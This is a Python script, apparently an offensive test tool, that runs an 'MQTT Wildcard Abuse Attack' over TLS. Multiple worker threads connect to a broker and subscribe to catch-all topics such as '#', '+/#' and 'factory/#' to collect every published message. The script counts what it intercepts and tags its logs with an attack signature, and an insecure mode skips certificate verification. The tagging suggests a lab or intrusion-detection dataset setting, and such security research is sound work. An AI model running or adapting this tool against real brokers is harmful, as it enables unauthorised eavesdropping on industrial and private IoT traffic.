#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import threading
import argparse
import sys
import ssl
import json
import os
from datetime import datetime

class WildcardAbuseAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883,
                 ca_certs=None, client_cert=None, client_key=None, insecure=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_certs = ca_certs
        self.client_cert = client_cert
        self.client_key = client_key
        self.insecure = insecure

        self.clients = []
        self.attack_stats = {
            "subscriptions_attempted": 0,
            "subscriptions_successful": 0,
            "subscriptions_failed": 0,
            "messages_received": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }

    def _print_cert_status(self):
        if self.ca_certs:
            print(f"  Using CA file: {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
        else:
            print("  No CA file provided; will use system CA store (if available).")
        if self.client_cert or self.client_key:
            print(f"  Client cert: {self.client_cert} -> {'FOUND' if (self.client_cert and os.path.exists(self.client_cert)) else 'MISSING or not provided'}")
            print(f"  Client key : {self.client_key} -> {'FOUND' if (self.client_key and os.path.exists(self.client_key)) else 'MISSING or not provided'}")
        print(f"  Insecure mode (skip verification): {self.insecure}")

    def create_client(self, client_id, username=None, password=None):
        try:
            client = mqtt.Client(client_id=client_id)

            if self.ca_certs and os.path.exists(self.ca_certs):
                client.tls_set(ca_certs=self.ca_certs,
                               certfile=self.client_cert if (self.client_cert and os.path.exists(self.client_cert)) else None,
                               keyfile=self.client_key if (self.client_key and os.path.exists(self.client_key)) else None,
                               cert_reqs=ssl.CERT_REQUIRED,
                               tls_version=ssl.PROTOCOL_TLS_CLIENT,
                               ciphers=None)
            else:
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
                    try:
                        ctx.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)
                    except Exception as e:
                        print(f"  Warning: failed to load client cert/key: {e}")
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                client.tls_set_context(ctx)

            if self.insecure:
                try:
                    client.tls_insecure_set(True)
                except Exception:
                    pass

            if username and password:
                client.username_pw_set(username, password)

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def wildcard_worker(self, worker_id, wildcard_topics, duration_seconds=60, username=None, password=None):

        client_id = f"abuse_attack111"
        client = self.create_client(client_id, username, password)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        def on_connect(client_obj, userdata, flags, rc):
            if rc == 0:
                print(f" Worker {worker_id}: Connected (TLS), starting wildcard abuse...")
                for topic in wildcard_topics:
                    try:
                        result = client_obj.subscribe(topic, qos=1)
                        self.attack_stats["subscriptions_attempted"] += 1

                        if isinstance(result, tuple) and result[0] == 0:
                            self.attack_stats["subscriptions_successful"] += 1
                            print(f" Worker {worker_id}: Subscribed to {topic} (TLS)")
                        else:
                            if result == 0:
                                self.attack_stats["subscriptions_successful"] += 1
                                print(f" Worker {worker_id}: Subscribed to {topic} (TLS)")
                            else:
                                self.attack_stats["subscriptions_failed"] += 1
                                print(f" Worker {worker_id}: Failed to subscribe to {topic}")
                    except Exception as e:
                        self.attack_stats["subscriptions_failed"] += 1
                        print(f" Worker {worker_id}: Error subscribing to {topic}: {e}")
            else:
                print(f" Worker {worker_id}: Connection failed: {rc}")
                self.attack_stats["connections_failed"] += 1

        def on_message(client_obj, userdata, msg):
            self.attack_stats["messages_received"] += 1
            if self.attack_stats["messages_received"] % 10 == 0:
                print(f" Worker {worker_id}: Received message on {msg.topic} (TLS)")

        def on_subscribe(client_obj, userdata, mid, granted_qos):
            subscription_log = {
                "timestamp": datetime.now().isoformat(),
                "packet_type": "SUBSCRIBE",
                "client_id": client_id,
                "topicfilter": wildcard_topics,
                "attack_signature": "R2_WILDCARD_ABUSE",
                "worker_id": worker_id,
                "mid": mid,
                "granted_qos": granted_qos
            }
            print(f" Worker {worker_id}: Subscription granted (mid={mid}) qos={granted_qos} (TLS)")
            print(f" [R2] {json.dumps(subscription_log)}")

        try:
            client.on_connect = on_connect
            client.on_message = on_message
            client.on_subscribe = on_subscribe

            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            time.sleep(duration_seconds)

            print(f" Worker {worker_id}: Completed wildcard abuse attack")

        except Exception as e:
            print(f" Worker {worker_id}: Error: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def launch_attack(self, num_workers=3, duration_seconds=60, wildcard_topics=None, username=None, password=None):

        if wildcard_topics is None:
            wildcard_topics = [
                "#",
                "+/+/+",
                "factory/#",
                "factory/office/+/telemetry",
                "factory/+/+/telemetry",
                "system/+",
                "+/#"
            ]

        print(f" Starting Wildcard Abuse Attack (TLS)")
        print(f"   Workers: {num_workers}")
        print(f"   Duration: {duration_seconds} seconds")
        print(f"   Wildcard topics: {len(wildcard_topics)}")
        print(f"   Broker: {self.broker_host}:{self.broker_port}")
        self._print_cert_status()
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()

        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.wildcard_worker,
                args=(i, wildcard_topics, duration_seconds, username, password)
            )
            threads.append(thread)

        for thread in threads:
            thread.start()

        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):

        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]

        print("\n Attack Statistics (TLS):")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Subscriptions attempted: {self.attack_stats['subscriptions_attempted']}")
        print(f"Subscriptions successful: {self.attack_stats['subscriptions_successful']}")
        print(f"Subscriptions failed: {self.attack_stats['subscriptions_failed']}")
        print(f"Messages received: {self.attack_stats['messages_received']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")

        if self.attack_stats['subscriptions_attempted'] > 0:
            success_rate = (self.attack_stats['subscriptions_successful'] /
                           self.attack_stats['subscriptions_attempted'] * 100)
            print(f"Subscription success rate: {success_rate:.1f}%")

        if duration > 0:
            print(f"Messages per second: {self.attack_stats['messages_received']/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Wildcard Abuse Attack (TLS)")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=8883, help="MQTT broker port")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--topics", nargs="+", help="Custom wildcard topics")
    parser.add_argument("--username", help="MQTT username for authentication")
    parser.add_argument("--password", help="MQTT password for authentication")

    parser.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
    parser.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
    parser.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
    parser.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")

    args = parser.parse_args()

    attack = WildcardAbuseAttackTLS(
        broker_host=args.broker,
        broker_port=args.port,
        ca_certs=args.ca,            
        client_cert=args.client_cert,
        client_key=args.client_key,  
        insecure=args.insecure       
    )

    attack.launch_attack(
        num_workers=args.workers,
        duration_seconds=args.duration,
        wildcard_topics=args.topics,
        username=args.username,
        password=args.password
    )

if __name__ == "__main__":
    main()
